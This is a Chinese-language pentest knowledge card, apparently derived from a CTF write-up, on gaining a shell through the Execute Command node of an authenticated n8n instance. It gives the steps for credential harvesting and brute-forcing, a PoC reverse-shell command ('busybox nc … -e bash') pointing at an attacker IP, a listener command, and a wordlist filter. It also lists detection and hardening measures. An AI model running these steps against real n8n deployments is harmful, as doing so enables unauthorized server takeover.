---
id: web-nodejs-n8n-authenticated-execute-command-workflow-rce
title: n8n 后台 Execute Command 节点：登录后建工作流直接执行系统命令
type: scenario
domain: web
path: web/nodejs
technique: n8n-execute-command-workflow-rce
tags:
- n8n
- nodejs
- rce
- workflow
- authenticated
- post-exploitation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V81
  verified_at: '2026-11-05T17:48:12+08:00'
  notes: 已对照原文 NodeCeption 章节与 img44-50：5678 为 n8n 面板，8765 Apache 页面注释泄露邮箱与口令策略，过滤 rockyou 后 Burp 爆破 login.php，随后登录 n8n，在 Core→Execute Command 执行 busybox nc 反弹获 thl shell；卡片一致，未实测。
url: /docs/web/nodejs/web-nodejs-n8n-authenticated-execute-command-workflow-rce/
draft: false
kb_aliases:
- n8n Execute Command RCE
- n8n 工作流命令执行
- n8n 后台 getshell
- n8n Core 节点
---

## 一句话结论

n8n 默认在 Core 节点中提供 “Execute Command” 能力；攻击者一旦通过弱口令、泄露凭据或会话劫持进入 n8n 后台，新建工作流并添加 Execute Command 节点，即可在 n8n 进程用户权限下执行任意系统命令、反弹 Shell，把 Web 后台权限升级为服务器 Shell。

## 原理

- n8n 是工作流自动化平台，Core 节点包含 Code、HTTP Request、Webhook 和 Execute Command；Execute Command 节点的设计目的就是让工作流调用宿主机命令。
- 该节点没有额外的“仅管理员/仅受信工作流”隔离：只要用户能创建/编辑并执行工作流，就能把任意命令写进 Command 参数并运行。
- 案例中攻击者先从 Apache 默认页 HTML 注释获得邮箱 `usuario@maildelctf.com` 和口令策略（至少 8 位、含数字和大写），用正则过滤 rockyou 生成字典，Burp 爆破 `login.php` 得到口令；随后登录 5678 端口的 n8n，创建工作流，添加 Execute Command，执行 `busybox nc <attacker> 4444 -e bash`，获得 n8n 用户 `thl` 的 Shell。
- 根因是“后台功能本身具备命令执行能力 + 账号/入口防护不足”；它既是 n8n 的设计功能，也是拿到后台后的标准利用路径。
- 即使 n8n 没有已知 CVE，弱口令/凭据泄露 + 后台命令节点就足以 RCE；因此资产测绘中暴露的 n8n 面板应被视为高价值目标。

## 触发条件

- n8n 管理面板可从攻击者网络访问（常见 5678）；
- 攻击者获得有效账号（弱口令、泄露凭据、会话劫持、SSO 配置缺陷）；
- 该账号有创建/编辑/执行工作流的权限；
- n8n 进程用户可执行系统命令（默认可以），且未被容器/策略限制。

## 利用步骤

1. 识别 n8n 面板（端口 5678、页面特征、`/rest/` API）。
2. 获取凭据：尝试默认/弱口令；从公开页面注释、源码、邮件、GitHub 等收集邮箱与口令策略；用策略过滤字典后爆破登录。
3. 登录后进入 Workflows，新建工作流，添加 Core → Execute Command 节点。
4. 在 Command 中填入反弹 Shell 或命令，例如 `busybox nc <attacker> 4444 -e bash`。
5. 点击 Execute step/Execute workflow，攻击机监听端口收到 Shell。
6. 以 n8n 进程用户身份收集配置、凭据与宿主机信息，继续提权/横向。

## PoC

```text
# n8n 工作流节点配置
Node: Execute Command (Core)
Command: busybox nc 192.0.2.10 4444 -e bash
Execute Once: true
```

```bash
# 攻击机监听
nc -lvnp 4444
# 触发工作流后收到 n8n 进程用户的 Shell
```

```bash
# 口令策略过滤示例（>=8 位、含数字/大写/小写）
cat rockyou.txt | grep -P '(?=.*\d)(?=.*[A-Z])(?=.*[a-z])' > pass.txt
```

## 变体与关联

- 变体：用 Code 节点执行 JavaScript/Python、HTTP Request 节点访问内网、Webhook 触发持久化工作流。
- 变体：若 Execute Command 被禁用，尝试 n8n 表达式沙箱逃逸（CVE-2025-68613）或 encryptionKey 伪造 admin 会话。
- 关联：[[web-nodejs-n8n-expression-sandbox-escape-rce]]、[[web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover]]、[[web-nodejs-n8n-form-content-type-confusion-file-read]]。
- 边界：n8n 强制 MFA/SSO、账号无工作流权限、Execute Command 节点被策略移除、进程运行在严格沙箱时，本路径不成立。

## 检测与防御

- 加固：n8n 面板不暴露公网；强口令 + MFA/SSO；按角色最小化工作流编辑/执行权限。
- 加固：禁用 Execute Command 节点或限制可用命令；n8n 进程以低权限用户/容器运行，限制出站与宿主机访问。
- 检测：登录爆破与异常登录；新建/修改工作流事件；Execute Command 节点执行与 `nc`/`bash` 子进程；n8n 进程外连异常端口。
